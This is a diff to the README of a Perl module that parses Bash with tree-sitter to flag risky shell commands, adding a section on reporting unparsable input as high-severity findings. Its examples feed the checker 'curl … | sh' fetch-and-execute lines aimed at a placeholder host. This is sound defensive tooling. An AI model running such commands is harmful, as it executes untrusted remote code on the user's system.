@@ -26,6 +26,13 @@ my @findings = $bash->findings('curl https://example.invalid/install.sh | sh');
 #        { type => 'network_to_shell',  ... },
 #      )
 
+# Source tree-sitter cannot parse is reported, never waved through:
+my @unparsed = $bash->findings('echo "oops ; curl https://example.invalid/x | sh');
+#   -> (
+#        { type => 'parse_error', start_byte => 5, end_byte => 48,
+#          source => '"oops ; curl https://example.invalid/x | sh', ... },
+#      )
+
 # Pluggable rule engine:
 my $checker = Text::Treesitter::Bash::Security::Checker->new(
     rules => [qw(
@@ -42,6 +49,7 @@ This distribution vendors the [`tree-sitter-bash`](https://github.com/tree-sitte
 
 - `commands($source)` returns one hash per executable unit (`command`, `declaration_command`, `unset_command`, `test_command`) with source spans, argv, and the surrounding shell-operator context.
 - `findings($source)` runs a fixed set of policy-light checks: shell interpreters, `bash -c` / `perl -e` style dynamic code, `eval` / `source`, and network-fetch piped into shell.
+- `parse_errors($source)` returns the regions tree-sitter could not parse (broken input, or Bash the vendored grammar does not know). tree-sitter never rejects a source, so `findings` appends these as `parse_error` findings and `check_source` as `ParseError` issues with severity `high` — "no findings" then really means "parsed completely, nothing matched". `commands` alone is best effort on such input.
 - `Text::Treesitter::Bash::Security::Checker` dispatches pluggable rules (`PathTraversal`, `DangerousFlags`, `SensitiveAccess`, `EnvDangerousVars`, `UnquotedExpansion`, `MissingAbsolutePath`) over the parsed commands and returns structured issues with severity.
 
 See [`docs/SECURITY.md`](docs/SECURITY.md) for the threat model, rule catalogue, and recommended approval flow.
